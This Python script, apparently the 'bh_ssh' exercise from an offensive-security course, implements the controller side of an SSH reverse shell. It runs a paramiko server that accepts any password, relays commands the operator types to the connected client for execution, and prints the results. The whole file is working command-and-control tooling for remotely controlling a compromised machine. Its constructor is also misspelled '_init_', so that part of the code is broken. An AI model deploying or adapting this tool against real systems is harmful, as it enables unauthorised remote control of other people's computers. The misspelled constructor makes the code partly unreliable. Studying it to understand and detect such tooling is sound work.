import os
import paramiko
import socket
import sys
import threading

# Path to the hostkey
CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'paramiko_demos/test_rsa.key'))

# Paramiko's ServerInterface implementation
class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    # IP and port of the server (change this)
    server = '192.168.100.87'
    ssh_port = 2222

    try:
        # Create and configure socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # Create a Transport that attaches to the client
    session = paramiko.Transport(client)
    # Set the server key and start the server
    session.add_server_key(HOSTKEY)
    session.start_server(server=Server())
    
    # Get the next channel opened by the client 
    channel = session.accept(20)

    if channel is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(channel.recv(1024))
    channel.send('Welcome to bh_ssh')

    try:
        # As long as the 'exit' command is not entered,
        # send commands to be executed in the client and
        # print the output
        while True:
            command = input('Enter command: ')
            
            if command != 'exit':
                channel.send(command)
                res = channel.recv(8192)
                print(res.decode())
            else:
                channel.send('exit')
                print('Exiting...')
                session.close()
                break
    except KeyboardInterrupt:
        session.close()
